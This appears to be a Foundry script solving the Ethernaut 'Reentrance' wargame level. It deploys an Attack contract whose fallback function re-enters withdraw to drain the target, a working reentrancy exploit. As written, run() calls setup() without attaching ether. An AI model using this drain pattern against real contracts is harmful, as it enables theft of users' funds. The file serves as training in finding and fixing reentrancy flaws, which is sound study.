pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../../src/Ethernaut/Reentrance.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Reentrance reentrance = Reentrance(0x677Af05a9d07e1A0a0C6e729012976A6Ccb65251);
        Attack attack = new Attack(payable(address(reentrance)));
        attack.setup();
        vm.stopBroadcast();
    }
}

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract Attack {
    address payable addr;

    constructor(address payable _instanceAddr) public payable {
        addr = _instanceAddr;
    }

    uint256 public balance;

    function setup() public payable {
        IReentrancy(addr).donate{value: msg.value}(address(this));
        IReentrancy(addr).withdraw(msg.value);
    }

    fallback() external payable {
        balance = IReentrancy(addr).balanceOf(address(this));
        if (balance > 0) {
            IReentrancy(addr).withdraw(balance);
        }
    }
}
